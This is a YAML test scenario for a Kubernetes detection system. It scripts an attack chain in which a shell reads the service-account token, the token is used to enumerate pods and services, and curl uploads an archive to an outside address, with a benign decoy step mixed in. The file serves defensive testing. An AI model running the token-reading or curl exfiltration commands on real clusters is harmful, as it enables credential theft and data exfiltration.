  # ========== Multi-step chains (multistep-chain-plan.md, phase 2b) ==========
  # Each chain crosses findings and sources, has an instance witness per hop,
  # and carries benign decoy steps (benign: true) in the same Pod that share
  # the Pod and lineage but no witness (ABSENT links). Each has a degraded
  # counterpart that loses one hop's witness in an eBPF gap.

  - id: chain_token_theft_exfil
    kind: attack
    title: "Chain: shell, SA token theft, API enumeration with the token, exfiltration"
    source:
      class: external
      citation:
        source: "MITRE ATT&CK for Containers"
        reference: "T1609 Container Administration Command; T1528 Steal Application Access Token; T1613 Container and Resource Discovery; T1041 Exfiltration Over C2 Channel"
        url: "https://attack.mitre.org/matrices/enterprise/containers/"
    author: "claude (multistep-chain-plan phase 2b, 2026-10-20)"
    adaptation_note: "A shell in a compromised Pod has cat read the projected SA token, uses it to enumerate the API, and has curl send data out. A sibling health-check process in the same Pod is a decoy."
    window_s: 45            # linked steps within W_w (60 s) with gap_of's x1.25 (D-22)
    roles:
      - name: compromised_pod
        kind: internal_pod
      - name: replica
        kind: peer_pod
        of: compromised_pod
    steps:
      - step: 1
        action: shell_exec
        params:
          parent_process: compromised_pod
          shell_binary: /bin/sh
          command: "sh -c 'read T < /var/run/secrets/kubernetes.io/serviceaccount/token'"
        outcome: success
      - step: 3
        action: read_token_file
        params:
          reader_process: "@step1.process"
          reader_executable: /bin/sh
          token_file_path: /var/run/secrets/kubernetes.io/serviceaccount/token
        outcome: success
        expects:
          - finding: D1
            state: PRESENT
            reason: "The shell reads the token itself (read builtin), outside the workload's expected readers"
      - step: 4
        action: process_exec
        benign: true
        float: decoy
        params:
          parent_process: compromised_pod
          executable: /app/healthcheck
          argv: [/app/healthcheck]
        outcome: success
      - step: 5
        action: api_request
        params:
          principal: compromised_pod
          verb: list
          api_group: ""
          resource: pods
          namespace: kube-system
        outcome: success
        expects:
          - finding: B1
            state: PRESENT
            reason: "Enumeration of kube-system pods outside baseline, with the stolen token"
      - step: 6
        action: api_request
        params:
          principal: compromised_pod
          verb: list
          api_group: ""
          resource: services
          namespace: default
        outcome: success
        expects:
          - finding: B1
            state: PRESENT
            reason: "Enumeration of services exceeds baseline"
      - step: 7
        action: process_exec
        params:
          parent_process: "@step1.process"
          executable: /usr/bin/curl
          argv: [curl, -T, /tmp/out.tgz, "https://198.51.100.23/u"]
